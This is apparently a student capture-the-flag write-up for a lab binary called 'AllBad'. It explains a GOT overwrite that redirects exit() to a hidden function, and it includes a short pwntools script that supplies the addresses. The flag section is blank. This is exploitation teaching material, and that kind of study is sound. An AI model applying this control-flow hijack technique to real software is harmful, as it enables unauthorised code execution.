# AllBad
### 📍 Description
Can you make the angry man express himself?

### 📄 Rules
- Do not patch this binary.
- Do not modify or delete the temp file.
- You MUST solve the challenge by providing valid inputs.
- You CANNOT just jump with the debugger to any function that directly prints the flag.
- If you think you're breaking these rules with your solution, please ask the teachers.

## 🔑 Solution
Using ida we see that the main function does nothing. But we noticed `give_the_man_a_guitar()` function. What we can do is ovveride the pointer to `exit()` to point to  `give_the_man_a_guitar()` function, so that when `exit(0)` is called at the end, it actually calls the other function.

```python
from pwn import *

elf = ELF('./vuln')

r = process('./vuln')
r.sendline(b'y')
r.sendline(str(elf.functions['give_the_man_a_guitar'].address))
r.sendline(str(elf.got['exit']))
```

### 🚩 Flag
```plain

```